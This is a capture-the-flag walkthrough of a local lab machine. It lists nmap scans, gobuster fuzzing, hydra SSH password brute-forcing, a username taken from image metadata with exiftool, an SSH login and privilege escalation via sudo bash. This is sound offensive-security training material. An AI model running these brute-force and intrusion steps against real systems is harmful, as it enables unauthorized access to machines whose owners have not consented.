![image](https://github.com/user-attachments/assets/374ceb90-ec8a-43da-bbe0-7d01e2960b58)
```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```
![Pasted image 20250122120119](https://github.com/user-attachments/assets/98063268-bfb7-4166-986b-f7dac808a972)
![Pasted image 20250122120143](https://github.com/user-attachments/assets/65ccbff3-f3d5-4fa6-8b05-5fadebdba089)
![Pasted image 20250122120214](https://github.com/user-attachments/assets/b2fe590c-57b9-496b-b5dc-78d3aefc0cbc)

## **Web Page**

![Pasted image 20250122120245](https://github.com/user-attachments/assets/f6e86c53-a46c-4f90-809d-4b9a04d11cec)

## **let's see the source code**
``CTRL+U``
![Pasted image 20250122120309](https://github.com/user-attachments/assets/c378dee1-f088-4ad0-ae8c-67e4eaf990f2)

## **and we only have one image nothing specific so we will continue researching and fuzziong trying to identify hidden directories.**
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
```
![Pasted image 20250122120426](https://github.com/user-attachments/assets/ad258bad-6ab2-4037-9f81-a885d3ef8e7c)

## **we have not obtained any result so we are going to try to brute force the SSH service**
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
```

## **one of the things we have overlooked is that we have an image to blame that could have hidden information.**

## **Download the image**
```bash
wget -c http://172.17.0.2/imagen.jpeg
```
![Pasted image 20250122120942](https://github.com/user-attachments/assets/49916c37-931e-4a2d-b445-c9072f6798c9)

```bash
steghide extract -sf imagen.jpeg
```
![Pasted image 20250122121808](https://github.com/user-attachments/assets/d0ad5f4d-d1eb-4830-8944-ed39d1b91584)

## **well we have not been able to find anything so we will keep looking at the image as this is what it doesn't say.**
```bash
exiftool imagen.jpeg
```
![Pasted image 20250122122211](https://github.com/user-attachments/assets/06b2d2cc-c6cb-4995-ba27-a9b960e7089f)

## **we already have a user now it's time to find a passwrd**
```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
```
![Pasted image 20250122122346](https://github.com/user-attachments/assets/8da844c8-a213-4b0c-aa46-d277f6b71e39)

```bash
ssh borazuwarah@172.17.0.2
```
![Pasted image 20250122122516](https://github.com/user-attachments/assets/d74368cf-ba89-4f05-bd59-24fdb9d06675)

## **we will try to elevate privileges**
```bash
sudo -l
```
![Pasted image 20250122122702](https://github.com/user-attachments/assets/7efe8d57-29f5-4ea6-b9ea-bac7b4d9970d)

```bash
sudo bash
```
![Pasted image 20250122122847](https://github.com/user-attachments/assets/d75b5eb3-84e6-4a91-9294-56e9110900af)









